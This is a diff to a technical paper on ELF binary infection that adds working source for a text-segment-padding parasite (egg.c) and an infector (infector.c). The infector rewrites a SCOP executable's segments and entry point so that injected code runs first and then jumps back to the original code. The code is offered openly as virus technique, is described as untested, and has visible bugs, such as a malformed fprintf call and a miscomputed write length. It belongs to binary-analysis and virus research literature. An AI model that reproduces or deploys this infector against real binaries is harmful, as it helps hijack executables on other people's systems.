@@ -20,7 +20,7 @@ like the ascii illustration 1.0 below.
 
 --ELF Illustration 1.0
 
-              PT_LOAD 0		PT_LOAD 1
+	      PT_LOAD 0		PT_LOAD 1
 [text_segment(R+X)][data_segment(R+W)]
 
 And all of the readonly data which doesn't require execution, such as the
@@ -128,13 +128,13 @@ infection sizes on 64bit.
 		 0x0000000000000148 0x0000000000000148	R      0x200000
 
 00400000-00401000 r--p 00000000 fd:01 3540930	test_scop_binary
-00600000-00601000 r-xp 00200000 fd:01 3540930   test_scop_binary
+00600000-00601000 r-xp 00200000 fd:01 3540930	test_scop_binary
 00800000-00801000 r--p 00400000 fd:01 3540930	test_scop_binary
 
 The text segment is broken up into 3 diferent memory mappings. The end of the
 executable mapping (Which is PT_LOAD[1]) is at 0x601000. This virtual address
 that begins the 3rd text segment (PT_LOAD[2]) is at 0x8000000, which leaves
-quite a bit of space for infection in general.  For injections that require
+quite a bit of space for infection in general.	For injections that require
 arbitrary length infections, there are alternative solutions that don't apply
 to this paper, see [4], and [5] which both use PT_NOTE to PT_LOAD conversions,
 thus allowing them variable length injection size.
@@ -159,6 +159,10 @@ elf_executable_text_offset. These are different than the traditional API
 functions we also have available: elf_text_filesz, elf_text_base,
 elf_text_offset.
 
+Since this type of infection is well explored, and the difference in approach
+is so subtle I have given an example of some un-tested code shown below that
+demonstrates how a text segment padding infection [3] would look. Do not fret
+though, in the 
 ... main function, etc. ...
 
 struct elf_segment segment;
@@ -339,7 +343,7 @@ gadget regions, but it eases the process of inserting code into the executable.
 
 Illustration 1.4
 		PT_LOAD[0]   PT_LOAD[1]			 PT_LOAD[2]    PT_LOAD[3]
-[elf_hdr][phdrs][text rdonly][text rd+exec][text-padding][text rdonly][data]
+[elf_hdr][phdrs][text rdonly][text rd+exec][text-parasite][text rdonly][data]
 
 -= SCOP Ultimate padding Algorithm
 
@@ -356,8 +360,231 @@ nothing more than a jump back to the original entry point. Due to the fact that
 most SCOP binaries are also PIE (position independent executable) we must use a
 few tricks to locate the original entry point and jump back to it.
 
+-- parasite code (egg.c) --
+
+/*
+ * infect.c will patch these values
+ * with the addrs of e_entry, and get_rip()
+ * from before they are relocated at runtime.
+ * These are then subtracted from eachother and
+ * from the instruction pointer to get the correct
+ * address to jump to.
+ */
+static unsigned long o_entry __attribute__((section(".data"))) = {0x00};
+static unsigned long vaddr_of_get_rip __attribute__((section(".data"))) = {0x00};
+
+unsigned long get_rip(void);
+
+extern long get_rip_label;
+extern long real_start;
+
+/*
+ * Code to jump back to entry point
+ */
+int volatile _start() {
+	unsigned long n_entry = get_rip() - (vaddr_of_get_rip - o_entry);
+
+	__asm__ volatile (
+		"movq %0, %%rbx\n"
+		"jmpq *%0" :: "g"(n_entry)
+		);
+}
+
+unsigned long get_rip(void)
+{
+	long ret;
+	__asm__ __volatile__
+	(
+	"call get_rip_label	\n"
+	".globl get_rip_label	\n"
+	"get_rip_label:		\n"
+	"pop %%rax		\n"
+	"mov %%rax, %0" : "=r"(ret)
+	);
+
+}
+
+
+-- infector (infector.c) --
+
+#define _GNU_SOURCE
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/types.h>
+#include <unistd.h>
+#include <fcntl.h>
+#include <sys/mman.h>
+#include <sys/stat.h>
+#include <elf.h>
+#include <link.h>
+#include <stdbool.h>
+#include <unistd.h>
+
+#include "/opt/elfmaster/include/libelfmaster.h"
+
+#define PAGE_ALIGN_UP(x) ((x + 4095) & ~4095)
+#define PAGE_ALIGN(x) (x & ~4095)
+
+#define TMP ".xyz.bitch"
+
+size_t code_len = 0;
+static uint8_t *code = NULL;
+
+bool
+patch_payload(const char *path, elfobj_t *target, elfobj_t *egg,
+    uint64_t injection_vaddr)
+{
+	elf_error_t error;
+	struct elf_symbol get_rip_symbol, symbol, real_start_symbol;
+	struct elf_section section;
+	uint8_t *ptr;
+	size_t delta;
+
+	if (elf_open_object(path, egg,
+	    ELF_LOAD_F_STRICT|ELF_LOAD_F_MODIFY, &error) == false) {
+		fprintf(stderr, "elf_open_object(): %s\n", elf_error_msg(&error));
+		return false;
+	}
+
+	if (elf_symbol_by_name(egg, "get_rip", &get_rip_symbol) == false) {
+		fprintf(stderr, "elf_symbol_by_name(\"get_rip\", ...)\n");
+		return false;
+	}
+	if (elf_symbol_by_name(egg, "_start", &real_start_symbol) == false) {
+		fprintf(stderr, "elf_symbol_by_name(\"real_start\", ...)\n");
+		return false;
+	}
+
+	delta = get_rip_symbol.value - real_start_symbol.value;
+	injection_vaddr += delta;
+
+	elf_symbol_by_name(egg, "vaddr_of_get_rip", &symbol);
+	ptr = elf_address_pointer(egg, symbol.value);
+	*(uint64_t *)&ptr[0] = injection_vaddr;
+	elf_symbol_by_name(egg, "o_entry", &symbol);
+	ptr = elf_address_pointer(egg, symbol.value);
+	*(uint64_t *)&ptr[0] = elf_entry_point(target);
+
+	return true;
+}
+
+int main(int argc, char **argv)
+{
+	int fd;
+	elfobj_t elfobj;
+	elf_error_t error;
+	struct elf_segment segment;
+	elf_segment_iterator_t p_iter;
+	size_t o_filesz;
+	size_t code_len;
+	uint64_t text_offset, text_vaddr;
+	ssize_t ret;
+	elf_section_iterator_t s_iter;
+	struct elf_section s_entry;
+	struct elf_symbol symbol;
+	uint64_t egg_start_offset;
+	elfobj_t eggobj;
+	uint8_t *eggptr;
+	size_t eggsiz;
+
+	if (argc < 2) {
+		printf("Usage: %s <SCOP_ELF_BINARY>\n", argv[0]);
+		exit(EXIT_SUCCESS);
+	}
+	if (elf_open_object(argv[1], &elfobj,
+	    ELF_LOAD_F_STRICT|ELF_LOAD_F_MODIFY, &error) == false) {
+		fprintf(stderr, "elf_open_object(): %s\n", elf_error_msg(&error));
+		exit(EXIT_FAILURE);
+	}
+	if (elf_flags(&elfobj, ELF_SCOP_F) == false) {
+		fprintf(stderr, "%s is not a SCOP binary\n", elf_pathname(&elfobj));
+		exit(EXIT_SUCCESS);
+	}
+	elf_segment_iterator_init(&elfobj, &p_iter);
+	while (elf_segment_iterator_next(&p_iter, &segment) == ELF_ITER_OK) {
+		if (segment.type == PT_LOAD && segment.flags == (PF_R|PF_X)) {
+			struct elf_segment s;
+
+			text_offset = segment.offset;
+			o_filesz = segment.filesz;
+			memcpy(&s, &segment, sizeof(s));
+			s.filesz += sizeof(code);
+			s.memsz += sizeof(code);
+			text_vaddr = segment.vaddr;
+			if (elf_segment_modify(&elfobj, p_iter.index - 1, &s, &error) == false) {
+				fprintf("stderr, segment_segment_modify(): %s\n",
+				    elf_error_msg(&error));
+				exit(EXIT_FAILURE);
+			}
+			break;
+		}
+	}
+	/*
+	 * Patch ./egg so that its two global variables 'uint64_t o_entry'
+	 * and 'uint64_t vaddr_of_get_rip' are set to the original entry
+	 * point of the target executable, and the address of where within
+	 * that executable the get_rip() function will be injected.
+	 */
+	if (patch_payload("./egg", &elfobj, &eggobj,
+	    text_offset + o_filesz) == false) {
+		fprintf(stderr, "Failed to patch payload \"./egg\"\n");
+		goto done;
+	}
+
+	/*
+	 * NOTE We must use PAGE_ALIGN on elf_text_base() because it's PT_LOAD
+	 * is a merged text and data segment, which results in having a p_offset
+	 * larger than 0, even though the initial ELF file header actually starts
+	 * at offset 0. Check out 'gcc -N -nostdlib -static code.c -o code' and
+	 * examine phdr's etc. to understand what I mean.
+	 */
+	elf_symbol_by_name(&eggobj, "_start", &symbol);
+	egg_start_offset = symbol.value - PAGE_ALIGN(elf_text_base(&eggobj));
+	eggptr = elf_offset_pointer(&eggobj, egg_start_offset);
+	eggsiz = elf_size(&eggobj) - egg_start_offset;
+
+	switch(elf_class(&elfobj)) {
+	case elfclass32:
+		elfobj.ehdr32->e_entry = text_vaddr + o_filesz;
+		break;
+	case elfclass64:
+		elfobj.ehdr64->e_entry = text_vaddr + o_filesz;
+		break;
+	}
+	/*
+	 * Extend the size of the section that the parasite code
+	 * ends up in
+	 */
+	elf_section_iterator_init(&elfobj, &s_iter);
+	while (elf_section_iterator_next(&s_iter, &s_entry)
+	    == ELF_ITER_OK) {
+		if (s_entry.size + s_entry.address == text_vaddr + o_filesz) {
+			s_entry.size += eggsiz;
+			elf_section_modify(&elfobj, s_iter.index - 1,
+			    &s_entry, &error);
+		}
+	}
+	elf_section_commit(&elfobj);
+
+	fd = open(TMP, O_RDWR|O_CREAT|O_TRUNC, 0777);
+	ret = write(fd, elfobj.mem, text_offset + o_filesz);
+	ret = write(fd, eggptr, eggsiz);
+	ret = write(fd, &elfobj.mem[text_offset + o_filesz + eggsiz],
+	    elf_size(&elfobj) - text_offset + o_filesz + eggsiz);
+	if (ret < 0) {
+		perror("write");
+		goto done;
+	}
+done:
+	close(fd);
+	rename(TMP, elf_pathname(&elfobj));
+	elf_close_object(&elfobj);
+}
+
 [1] https://www.bitlackeys.org/secure_code_partitioning_2018.txt
-[2] Book: Learning Linux binary analysis, chapter 4 'ELF Virus technology'	 
+[2] Book: Learning Linux binary analysis, chapter 4 'ELF Virus technology'
 [3] UNIX ELF parasites and viruses http://83.133.184.251/virensimulation.org/lib/vsc01.html
 [4] https://github.com/elfmaster/dsym_obfuscate
 [5] http://83.133.184.251/virensimulation.org/lib/vrn01.html (Retaliation Virus)
+
